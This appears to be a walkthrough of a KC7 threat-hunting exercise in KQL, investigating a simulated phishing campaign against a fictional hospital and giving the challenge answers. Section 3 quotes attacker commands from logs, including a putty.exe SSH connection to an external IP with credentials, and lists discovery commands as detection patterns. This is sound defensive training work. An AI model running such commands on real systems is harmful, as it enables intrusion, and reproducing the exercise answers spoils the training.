Let's dive right into section 1: KQL 101!
How many employees work at Azure Crest Hospital?
Employees
| count
So this one will go to the Employees table and simply count the number of rows.
Answer: 250

What is the Chief Financial Officer's name?
Employees
| where role == "Chief Financial Officer"
And this one will look up roles in the Employees table and only return the row where the role is "Chief Financial Officer".
Answer: Penny Pincher
And for future reference, Penny's: IP - 10.10.0.1, email - penny_pincher@azurecresthospital.med, username - pepincher, and hostname - TEX4-MACHINE

How many emails did Penny Pincher receive?
We are given this template:
Email
| where recipient == "<Penny Pincher's Email Address Here>"
| count
So let's plug in the relevant info and we get: 30

How many distinct senders were seen in the email logs from pharmabest.net?
And we are given:
Email
| where sender has "<Domain Name>"
| distinct <field>
| count
Let's plug in "pharmabest.net" and "sender" and we get: 236

How many distinct websites did “Penny Pincher” visit?
And we're given:
OutboundNetworkEvents
| where src_ip == "<Penny Pincher's IP>"
| <operator> <field>
| <operator>
Luckily, we took notes earlier, so let's plug in her IP, "distinct" and "url", and "count".
Answer: 68

How many distinct domains in the PassiveDns records contain the word “health”?
And we have: 
PassiveDns
| where <field> contains <value>
| <operator> <field>
| <operator>
Let's plug in: domain, health, distinct, domain, count
Answer: 28

What IPs did the domain “bit.ly” resolve to (enter any one of them)?
And we are given:
PassiveDns
| where domain == "<domain>"
| distinct <field>
Let's plug in: "bit.ly", ip
There are 2: 134.177.143.174, 42.143.126.108

How many distinct URLs did employees with the first name "Mary" Visit?
Getting a little trickier. We are given:
let mary_ips = 
Employees
| where name has "<Employee Name>"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (mary_ips)
<more kql here>
So this will create a variable called mary_ips. It will store in that variable the output of the next block, which in this case goes to Employees, looks up any employee named Mary, and grabs the unique IP addresses associated. After that, it will go to the OutboundNetworkEvents table, look for a src_ip that matches any IP just found in mary_ips, and then we have to plug in the rest. The rest being:
| distinct url
| count
Answer: 119

How many authentication attempts did we see to the accounts of employees with the first name Mary?
This time we are only given:
let <list_variable_name> = Employees
| where name has "<Employee Name>"
| distinct username;
AuthenticationEvents
| where username in (<list_variable_name>)
| count
So here's what I came up with:
let users = 
Employees
| where name has "Mary"
| distinct username;
AuthenticationEvents
| where username in (users)
| count
The logic forthe previous question is roughly the same here, just with AuthenticationEvents instead of OutboundNetworkEvents.
Answer: 180


Section 2: Quarantine Quandry
We received a security alert a few days ago that a file with the word 'healthcare' was quarantined. What is the name of the file that was quarantined?
Alright, no template here. Let's give this a shot:
FileCreationEvents
| where filename contains "healthcare"
I ran that, but it returns ALL of the info for the file creation event. Let's add:
| distinct filename
And that will throw out just the filename.
Answer: New_Healthcare_Protocols.docm

What is the hostname of the computer that contained this file?
FileCreationEvents
| where filename contains "healthcare"
| distinct hostname
This returns 23 results, though. Through the help of KC7's Discord, I was informed of a table called SecurityAlerts, so let's check that table out:
SecurityAlerts
| where indicators contains "healthcare"
This returns 2 results, one for a HOST and one for an EMAIL. Let's go to the HOST one and grab the hostname (also in the indicators field): ZQHM-LAPTOP

What is the name of the employee that this computer belongs to?
Let's go back to the Employees table:
Employees
| where hostname == "ZQHM-LAPTOP"
Answer: Jerry Jones
And for reference later: Jerry's IP - 10.10.0.174, email - jerry_jones@azurecresthospital.med, username - jejones, role - Resident Doctors

What is that employee's role at Azure Crest Hospital?
Thank goodness we just took notes!

When was this file created on the doctor's computer? (paste the full timestamp)
Back to FileCreationEvents:
FileCreationEvents
| where hostname == "ZQHM-LAPTOP"
| where filename contains "healthcare"
Answer: 2024-03-14T10:38:36.000Z

What process did we see create this file? (process name)
Scroll all the way to the right: chrome.exe

What domain was the file downloaded from?
Let's try this out (just to try, not even sure if it's right):
OutboundNetworkEvents
| where url contains "New_Healthcare_Protocols.docm"
Well, that gives us 9 unique results, so probably not that. Oh, right! Let's add in the IP as a filter:
| where src_ip == "10.10.0.174"
And then we see one result, with a URL of: http://takeyatimecarepartners.com/images/images/files/New_Healthcare_Protocols.docm
Answer: takeyatimecarepartners.com

Which legitimate Azure Crest partner's domain is the threat actor attempting to mimic?
If we go back to the Emails table and look for some key"words" within that domain name, we can filter on those:
Email
| where link contains "take"
Hmm.. nothing new there.. let's replace "take" with "care"
And we see: emergencycarepartners.com

What is Jerry's email address?
Good thing we took notes earlier!

How many emails did Jerry Jones receive?
Email
| where recipient == "jerry_jones@azurecresthospital.med"
Answer: 23

When did Jerry receive the email that contained a link to the quarantined file? (paste the full timestamp)
Email
| where recipient == "jerry_jones@azurecresthospital.med"
| where link contains "healthcare"
Answer: 2024-03-14T10:27:39.000Z

What is the sender's address for that email?
medstaffinfo@hospitalcomm.org
Double m at the end, AND an attempt to double up on TLDs? Suspicious!

What 'reply to' address is used?
healthupdate@gmail.com
Even more suspicious that it doesn't match the sender!

What is the subject of the email?
[EXTERNAL] FW: 🚑 Attention Required: Urgent Pediatric Health Procedure Update 🌈
And it's an external email? Definitely fishy (or... phishy?)

It looks like Jerry received another email from this sender. When did Jerry receive that email? (paste the full timestamp)
Really, what we're looking for here is the reply_to column (because filtering on the sender column only gave us back that 1 email):
Email
| where recipient == "jerry_jones@azurecresthospital.med"
| where reply_to == "healthupdate@gmail.com"
And we see another email sent at: 2024-03-06T11:49:48.000Z

What is filename seen in the link?
Pediatric_Care_Update.docm


Section 3: The Phisher's Net
How many Azure Crest employees received emails containing a link to the previously identified (.docm) files?
This one gets a bitmore involved:
Email
| where link has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
| distinct recipient 
This will filter out emails with those 2 filenames in the link field, and find the unique recipients.
Answer: 40

How many distinct subjects did the threat actors use in this batch of emails?
Change the previous query from "distinct recipient" to "distinct subject"
Email
| where link has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
| distinct subject 
However, this gives 11 results. Confirmed in the Discord that that is the incorrect answer, so we'll have to eyeball this one. Filter out (manually, so as not to make mistakes in querying - it seems creating 1 query for this would be very convoluted) the unique ones.
Answer: 7

How many distinct links did the threat actors use in this batch of emails?
This one should work if we change "distinct recipient" to "distinct link"
Answer: 17

How many distinct domains were used in this batch of emails?
I'd just eyeball this one: 4

How many employees clicked on the email links?
OutboundNetworkEvents
| where url has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
| distinct src_ip
This will check for outbound connections (from internal to the rest of the world), look for those files in the URL, and return the unique IPs.
Answer: 37
Uh oh!

How many records are there for either of these files being on Azure Crest employee computers?
Very similar query:
FileCreationEvents
| where filename has_any ("Pediatric_Care_Update.docm", "New_Healthcare_Protocols.docm")
Answer: 38
Even more uh oh!

What is the timestamp for the first time one of these files was created?
2024-03-01T11:58:33.000Z

What is the name of the file that is created after the suspicious file is downloaded?
Ok, let's take the hostname from that timestamp we just used: P3EX-DESKTOP
And try:
FileCreationEvents
| where hostname == "P3EX-DESKTOP"
| where timestamp > datetime(2024-03-01T11:58:33.000Z)
This will filter on that first host to download it and look for events after that initial download. The very first result should be our answer: heartburn.zip

What is the directory path that contains this new file?
Back one columns to the left: C:\ProgramData\Heartburn

On that machine, how many additional files are created in the same directory?
Let's add this to our query:
| where path contains "C:\\ProgramData\\Heartburn"
And the double slashes are to escape the character.
Answer: 3

What command was used to extract the additional files from the zip file into the same directory where it was located?
For this, let's go to ProcessEvents:
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline contains "heartburn.zip"
This will go to that hostname in the table and find command line instances where that zip file was mentioned: cmd.exe /c Expand-Archive -Path C: \ProgramData\heartburn.zip -DestinationPath C:\ProgramData\Heartburn

What is the IP address that putty.exe uses to establish it's SSH connection?
Change "heartburn.zip" to "putty" and we get:
cmd.exe /c C:\ProgramData\Heartburn\putty.exe -ssh 93.142.203.80 -l have_ya_tried -pw turning_it_off_and_on_again
Answer: 93.142.203.80

What does the acronym SSH stand for?
This is open source intelligence or prior knowledge: secure shell

How many unique IP addresses were used to initiate similar SSH connections?
I did this:
ProcessEvents
| where process_commandline contains "putty"
| distinct process_commandline
Which will grab distinct commands, meaning it would grab the ones with different IPs listed in the command.
Answer: 17

What username is used to initiate the SSH connection?
Just look a bit closer at those results: have_ya_tried

What is the password used to initiate the SSH connection?
Same deal: turning_it_off_and_on_again

Discovery commands are often run by an attacker to collect information about the target system or network. How many of these commands were run on the victim's computer?
For this, I looked up what is considered a discovery command (hint: I used this source - https://car.mitre.org/analytics/CAR-2016-03-001/)
ProcessEvents
| where hostname == "P3EX-DESKTOP"
| where process_commandline has_any ("hostname", "ipconfig", "net", "quser", "qwinsta", "sc", "systeminfo", "tasklist", "dsquery", "whoami")
Answer: 5

How many of our employee computers have been compromised?
I edited the above query, because using those commands is probably a good IOC (indicator of compromise):
ProcessEvents
| where process_commandline has_any ("hostname", "ipconfig", "net", "quser", "qwinsta", "sc", "systeminfo", "tasklist", "dsquery", "whoami")
| where hostname has_any ("MACHINE", "DESKTOP", "LAPTOP") //Because without this, we also return a server, which is not an employee computer
| distinct hostname
This gives us 32, though, which still isn't right. I adjusted and cameback to:
ProcessEvents
| where process_commandline contains "putty"
| distinct hostname
Answer: 35

